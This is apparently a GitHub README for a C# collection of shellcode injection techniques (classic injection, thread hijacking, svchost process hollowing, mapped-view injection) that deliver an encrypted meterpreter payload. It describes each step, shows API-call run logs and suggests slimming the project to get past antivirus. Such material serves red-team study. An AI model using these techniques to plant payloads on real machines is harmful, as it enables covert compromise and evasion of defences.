# Shellcode Injection Techniques
A collection of C# shellcode injection techniques. All techniques use an AES encrypted meterpreter payload.

I will be building this project up as I learn, discover or develop more techniques.

**Note:** The project is not intended to be used as-is. If you are going to use any of the techniques there is a better chance of bypassing AV if you create a smaller, customised project with your chosen technique.

## Classic Injection
[ClassicInjection.cs](https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/ShellcodeInjectionTechniques/Techniques/ClassicInjection.cs) : This technique allocates memory in the target process, injects the shellcode and starts a new thread.

```
[+] Found process: 24484
[+] Using technique: ShellcodeInjectionTechniques.ClassicInjection
[+] VirtualAllocEx(), assigned: 0x23642220000
[+] WriteProcessMemory() - remote address: 0x23642220000
[+] CreateRemoteThread() - thread handle: 0x380
```

## Thread Hijacking
[ThreadHijack.cs](https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/ShellcodeInjectionTechniques/Techniques/ThreadHijack.cs) : This technique hijacks a thread by injection code into the target process, suspends the hijacked thread, sets the instruction pointer (RIP) to our injected code and then resumes the thread.

```
[+] Found process: 11508
[+] Using technique: ShellcodeInjectionTechniques.ThreadHijack
[+] Found thread: 9344
[+] OpenThread() - thread handle: 0x378
[+] VirtualAllocEx(), assigned: 0x1D17AB80000
[+] WriteProcessMemory() - remote address: 0x1D17AB80000
[+] SuspendThread() - thread handle: 0x378
[+] GetThreadContext() - thread handle: 0x378
[+] RIP is: 0x7FFA77D21104
[+] SetThreadContext(), RIP assigned: 0x1D17AB80000
[+] ResumeThread() - thread handle: 0x378
```

## Process Hollowing
[ProcessHollow.cs](https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/ShellcodeInjectionTechniques/Techniques/ProcessHollow.cs) : This technique starts another process in the suspended state (svchost.exe), finds the main thread entry point, injects our shellcode into it then resumes the thread.

```
[+] Using technique: ShellcodeInjectionTechniques.ProcessHollow
[+] CreateProcess(): C:\Windows\System32\svchost.exe
[+] Pointer to ImageBase: 0xD31E956010
[+] ReadProcessMemory() - image base pointer: 0xD31E956010
[+] ImageBase: 0x7FF6116C0000
[+] ReadProcessMemory() - svchost base: 0x7FF6116C0000
[+] EntryPoint: 0xD31E956010
[+] WriteProcessMemory(): 0x7FF6116C4E80
[+] ResumeThread() - thread handle: 0x454
```

### Note
When using process hollowing you need to comment out the code in `Program.cs` that looks for the process to inject into:

```csharp
/*
 Process[] processes = Process.GetProcessesByName("notepad");

if(processes.Length == 0)
{
  Debug("[!] Unable to find process to inject into!");
  return;
}

Debug("[+] Found process: {0}", new string[] { processes[0].Id.ToString() });
target = processes[0];
*/
```

## Inter-Process Mapped View
[InterProcessMappedView.cs](https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/ShellcodeInjectionTechniques/Techniques/InterProcessMappedView.cs) : This technique creates a new section in memory, creates a local mapped view of the section, copies our shellcode into the local mapped view and creates a remote mapped view of the local mapped view in the target process. Finally we create a new thread in the target process with the mapped view as the entry point.

```
[+] Found process: 23740
[+] Using technique: ShellcodeInjectionTechniques.InterProcessMappedView
[+] NtCreateSection() - section handle: 0x37C
[+] NtMapViewOfSection() - local view: 0x20CB8E40000
[+] Marshalling shellcode
[+] NtMapViewOfSection() - remote view: 0x22D90310000
[+] RtlCreateUserThread() - thread handle: 0x384
```

## Notes
Remember you will need to start a process to inject to, except when using Process Hollowing (this technique starts a new process in the suspended state).

```
[!] Unable to find process to inject into!
```
